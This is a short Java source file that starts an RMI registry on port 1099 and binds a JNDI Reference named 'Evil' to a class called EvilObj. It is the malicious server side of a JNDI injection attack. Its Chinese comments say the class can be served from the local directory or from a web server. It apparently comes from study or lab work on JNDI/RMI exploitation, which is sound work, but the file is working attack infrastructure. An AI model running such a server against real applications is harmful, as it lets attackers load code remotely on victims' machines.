package com.fdx.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        //启动rmi服务 端口为1099
        LocateRegistry.createRegistry(1099);
        Registry registry = LocateRegistry.getRegistry();
        //创建资源为本机目录的EvilObj类，其中null代表本机目录，也可以指定服务器，如127.0.0.1:80绑定为本机nginx下资源
        Reference reference = new Reference("com.fdx.rmi.EvilObj", "com.fdx.rmi.EvilObj", null);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        //绑定资源
        registry.bind("Evil",referenceWrapper);
        System.out.println("初始化成功");

    }
}
